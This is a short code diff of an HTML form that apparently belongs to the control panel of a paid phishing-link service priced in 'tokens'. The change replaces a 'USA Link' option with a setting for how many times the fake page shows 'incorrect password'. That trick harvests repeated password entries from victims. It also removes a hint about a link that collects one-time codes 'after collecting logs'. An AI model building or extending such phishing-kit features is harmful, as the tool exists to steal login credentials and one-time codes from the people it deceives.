@@ -165,18 +165,20 @@ describe your link...</textarea
         </small>
       </div>
       <div class="mb-3">
-        <label>USA Link</label>
+        <label>Number of Password Retries</label>
         <select
           class="form-select form-control text-white"
           aria-label="Require OTP"
           required
-          name="usLink"
+          name="numberOfRetries"
         >
-          <option value="true" class="text-white">Yes</option>
-          <option value="false" class="text-white">No</option>
+          <option value="1" class="text-white">0</option>
+          <option value="2" class="text-white">1</option>
+          <option value="3" class="text-white">2</option>
+          <option value="4" class="text-white">3</option>
         </select>
         <small class="text-white"
-          >You will be charged from your USA tokens.
+          >How many times you want it to show incorrect password
         </small>
       </div>
       <div class="mb-3">
@@ -194,9 +196,6 @@ describe your link...</textarea
           <option value="8" class="text-white">2 Months</option>
           <option value="12" class="text-white">3 Months</option>
         </select>
-        <small class="text-white"
-          >Yes for the link to collect OTP after collecting logs
-        </small>
       </div>
       <div class="mb-3">
         <label for="">Price(in tokens)</label>
